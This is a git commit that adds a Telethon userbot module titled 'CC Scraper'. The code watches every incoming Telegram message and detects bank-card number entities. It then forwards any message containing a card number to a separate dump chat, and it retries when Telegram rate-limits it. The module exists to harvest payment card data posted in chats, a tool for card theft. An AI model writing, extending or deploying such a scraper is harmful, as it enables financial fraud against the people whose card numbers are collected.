6cdb6287026c9fa504c3d35a05c180c8e101c13a
Nitin1818 <74262832+xbinner18@users.noreply.github.com>
2022-06-04 09:04:43 +0530

    CC Scraper
    No re expression shits 
    When client given u a direct method just use it

---
+++ ubb/modules/scrape.py
@@ -0,0 +1,20 @@
+import asyncio
+from telethon import events, types, errors
+from ubb import Ubot, DUMP_ID
+
+
+@Ubot.on(events.NewMessage())  # pylint:disable=E0602
+async def check_incoming_messages(event):
+    entities = event.message.entities
+    is_cc = False
+    if entities:
+        for entity in entities:
+            if isinstance(entity, types.MessageEntityBankCard):
+                is_cc = True
+            if is_cc:
+                try:
+                    await Ubot.send_message(DUMP_ID, event.message.message)
+                except errors.FloodWaitError as e:
+                    await asyncio.sleep(e.seconds)
+                    await Ubot.send_message(DUMP_ID, event.message.message)
+                    print(f'flood wait: {e.seconds}')
